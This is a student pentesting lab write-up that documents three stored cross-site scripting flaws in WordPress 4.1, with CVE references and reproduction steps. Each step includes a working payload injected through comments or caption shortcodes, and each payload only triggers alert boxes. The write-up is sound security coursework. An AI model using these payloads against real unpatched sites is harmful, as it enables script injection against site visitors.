# Project 7 - WordPress Pentesting

Time spent: **8** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1.  Unauthenticated Stored Cross-Site Scripting CVE-2015-3440
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.1
    - Fixed in version: 4.2.1
  - [ ] GIF Walkthrough: 
  
  ![AAA](https://github.com/jlangdev/WPvsKali/blob/master/64AAA.gif)
  - [ ] Steps to recreate: 
      - Use some sort of program or text generator to generate 64KB worht of text
      - Submit the following as a comment
      ```
      <a title='x onmouseover=alert(unescape(/hello%20world/.source))
      style=position:absolute;left:0;top:0;width:5000px;height:5000px  
      [INSERT YOUR 64KB OF TEXT HERE WITHOUT THESE SQUARE BRACKETS]'></a>
      ```
      - Once approved, the script will execute when the comment is loaded
  - [ ] Affected source code:
    - [CVE Details](https://www.cvedetails.com/cve/CVE-2015-3440/)
2. Publish Post & Mark as Sticky Permission Issue ID WPVDB-ID:8188
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.1
    - Fixed in version: 4.1.8
  - [ ] GIF Walkthrough: 
  
    ![Sticky](https://github.com/jlangdev/WPvsKali/blob/master/sticky.gif)
  - [ ] Steps to recreate:
    - Create a new post as an administrator with the following text:
    ```
    misc buffoonery[caption width='1' caption='<a href="' ">]</a>
    <a href="http://onMouseOver='alert(/get rekt lmao/)'
    style='display:block;position:absolute;top:0px;left:0px;margin-left:
    -1000px;margin-top:-1000px;width:99999px;height:99999px;'"></a>
    ```
    - Submit the post as private and then edit it
    - update the post as public and stickied
    - js will execute upon page load
  - [ ] Affected source code:
    - [WP Vulnerabilities DB entry](https://wpvulndb.com/vulnerabilities/8188)
3. Authenticated Stored Cross-Site Scripting wordpress DCVE-2015-5622
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.1
    - Fixed in version: 4.2.2
  - [ ] GIF Walkthrough: 
  
     ![Contributor](https://github.com/jlangdev/WPvsKali/blob/master/Contributor.gif)
  - [ ] Steps to recreate:
    -create a new account with the role of contributor and log in to it
    -create a new post with the following text:
    ```
    miscellaneous blabbering for the sake of hiding your exploitive murmurings
    <a href="[caption code=">]</a><a title=" onmouseover=alert('rekt') ">yeetus</a>
    sandwich the exploit betwixt some form of admirable prose
    ```
  - [ ] Affected source code:
    - [CVE Details](https://www.cvedetails.com/vulnerability-list/vendor_id-2337/opxss-1/Wordpress.html)
 
